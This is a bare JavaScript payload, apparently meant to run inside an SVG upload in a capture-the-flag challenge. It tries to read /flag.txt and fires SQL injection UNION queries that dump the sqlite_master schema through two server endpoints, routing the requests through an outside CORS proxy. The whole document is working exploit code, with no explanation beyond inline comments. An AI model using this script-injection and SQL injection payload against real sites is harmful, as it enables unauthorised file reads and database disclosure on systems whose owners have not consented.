svg.script:
async function tryAllEndpoints() {
   // 1. First try direct flag.txt
   try {
     const flagResp = await fetch('/flag.txt');
     const flagData = await flagResp.text();
     alert('Flag.txt response: ' + flagData);
     if (flagData.includes('nexus{')) {
       alert('FLAG FOUND in flag.txt: ' + flagData);
       return;
     }
   } catch (e) {
     alert('Error fetching flag.txt: ' + e.message);
   }
   // 2. Try the search endpoint with SQLi
   try {
     const sqlQuery = "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --";
     const searchResp = await fetch('https://cors-anywhere.herokuapp.com/https://localhost:8001/f/search?q=' + encodeURIComponent(sqlQuery));
     const searchData = await searchResp.text();
     alert('Search endpoint response length: ' + searchData.length);
     if (searchData.includes('_') && searchData.includes('flag_')) {
       alert('Found promising data in search response!');
     }
   } catch (e) {
     alert('Error with search endpoint: ' + e.message);
   }
   // 3. Try the fetch endpoint
   try {
     const params = new URLSearchParams();
     params.append('q', "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --");
     const fetchResp = await fetch('https://cors-anywhere.herokuapp.com/https://localhost:8001/fetch', {
       method: 'POST',
       body: params
     });
     const fetchData = await fetchResp.text();
     alert('Fetch endpoint response length: ' + fetchData.length);
     if (fetchData.includes('_') && fetchData.includes('flag_')) {
       alert('Found promising data in fetch response!');
     }
   } catch (e) {
     alert('Error with fetch endpoint: ' + e.message);
   }
 }
 tryAllEndpoints();
